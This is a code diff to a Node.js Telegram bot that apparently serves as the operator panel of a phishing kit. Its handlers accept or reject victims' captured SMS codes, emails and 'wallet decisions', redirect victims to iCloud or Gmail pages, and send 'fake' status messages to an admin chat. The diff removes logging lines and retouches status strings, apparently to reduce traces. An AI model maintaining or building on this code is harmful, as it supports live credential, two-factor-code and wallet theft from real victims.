@@ -381,7 +381,6 @@ bot.on("callback_query", async (query) => {
         if (statusMessage) {
           try {
             await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
-            console.log(`✅ Status message sent for wallet decision: ${statusMessage}`);
           } catch (err) {
             console.error(`❌ Error sending status message:`, err.message);
           }
@@ -497,7 +496,6 @@ bot.on("callback_query", async (query) => {
       try {
         // Send fake status message
         await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
-        console.log(`✅ FAKE status message sent: ${statusMessage}`);
       } catch (err) {
         console.error("Error sending fake status:", err);
       }
@@ -605,9 +603,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>!✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>!❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -844,7 +842,6 @@ if (bot2) {
             });
             
             if (response.ok) {
-              console.log(`✅ Status message sent for wallet decision (Bot 2): ${statusMessage}`);
             } else {
               console.error(`❌ Failed to send status message (Bot 2). Response status: ${response.status}`);
             }
@@ -1100,7 +1097,6 @@ if (bot2) {
             });
             
             if (response.ok) {
-              console.log(`✅ Status message sent for wallet decision: ${statusMessage}`);
             } else {
               console.error(`❌ Failed to send status message. Response status: ${response.status}`);
             }
